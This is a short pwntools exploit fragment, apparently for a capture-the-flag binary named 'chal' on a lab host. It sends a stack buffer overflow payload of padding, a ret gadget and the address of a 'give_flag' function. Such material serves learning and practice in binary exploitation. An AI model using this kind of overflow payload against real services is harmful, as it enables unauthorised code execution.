...
# $ pwn template --template template.mako --host 10.10.10.10 --port 9000 ./chal
from pwn import *
...
rop = ROP(exe)
io.sendline(b'A' * 64 + b'B' * 8 + p64(rop.find_gadget(['ret']).address) + p64(exe.symbols.get('give_flag')))
